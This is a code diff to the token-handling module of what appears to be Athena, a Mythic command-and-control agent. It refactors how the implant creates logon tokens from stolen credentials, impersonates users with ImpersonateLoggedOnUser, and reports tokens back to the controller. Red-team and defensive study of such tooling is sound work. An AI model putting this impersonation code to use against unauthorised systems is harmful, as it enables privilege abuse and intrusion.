@@ -19,9 +19,7 @@ namespace Athena.Commands
 {
     public class TokenHandler
     {
-        //static Dictionary<string, SafeAccessTokenHandle> tokens = new Dictionary<string, SafeAccessTokenHandle>();
         static Dictionary<string, Token> tokens = new Dictionary<string, Token>();
-        static string impersonatedUser = "";
 
         public async Task<object> CreateToken(MythicJob job)
         {
@@ -42,7 +40,7 @@ namespace Athena.Commands
                     {
                         Handle = hToken,
                         description  = tokenOptions.username,
-                        TokenID = tokens.Count + 1
+                        TokenId = tokens.Count + 1
                     };
                     
                     if (tokenOptions.username.Contains("@"))
@@ -65,11 +63,11 @@ namespace Athena.Commands
                         completed = "true",
                         task_id = job.task.id,
                         //tokens = new List<Token>() { token },
-                        callback_tokens = new List<CallbackToken> { new CallbackToken()
+                        callbacktokens = new List<CallbackToken> { new CallbackToken()
                         {
                             action = "add",
                             host = System.Net.Dns.GetHostName(),
-                            TokenID = token.TokenID,
+                            TokenId = token.TokenId,
                         } }
                         
                     };
@@ -96,53 +94,17 @@ namespace Athena.Commands
                 };
             }
         }
-        public async Task<bool> ThreadImpersonate()
+        public async Task<bool> ThreadImpersonate(Token t)
         {
-            if (!String.IsNullOrEmpty(impersonatedUser))
+            if (tokens.ContainsKey(t.description))
             {
-                return Pinvoke.ImpersonateLoggedOnUser(tokens[impersonatedUser].Handle);
+                return Pinvoke.ImpersonateLoggedOnUser(tokens[t.description].Handle);
             }
-            return true; //No impesronation to do so just return
+            return false;
         }
         public async Task<bool> ThreadRevert()
         {
             return Pinvoke.RevertToSelf();
-        }
-        public async Task<object> SetToken(MythicJob job)
-        {
-            var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-            string user = tokenInfo["name"].ToString();
-            if (tokens.ContainsKey(user))
-            {
-                impersonatedUser = user;
-                return new ResponseResult()
-                {
-                    user_output = $"Token set to {user}",
-                    status = "success",
-                    completed = "true",
-                    task_id = job.task.id,
-                };
-            }
-
-            return new ResponseResult()
-            {
-                user_output = $"No token with name: {user}",
-                status = "errored",
-                completed = "true",
-                task_id = job.task.id,
-            };
-        }
-        public async Task<object> RevertToSelf(MythicJob job)
-        {
-            impersonatedUser = "";
-
-            return new ResponseResult()
-            {
-                user_output = $"No longer impersonating",
-                status = "success",
-                completed = "true",
-                task_id = job.task.id,
-            };
         }
         public async Task<object> ListTokens(MythicJob job)
         {
@@ -151,16 +113,7 @@ namespace Athena.Commands
             sb.AppendLine("------------------------------");
             foreach (var token in tokens)
             {
-                if (token.Key == impersonatedUser)
-                {
-                    sb.AppendFormat($"{token.Key} (Current)").AppendLine();
-
-                }
-                else
-                {
-                    sb.AppendFormat($"{token.Key}").AppendLine();
-
-                }
+                sb.AppendFormat($"{token.Key}").AppendLine();
             }
 
             return new ResponseResult()
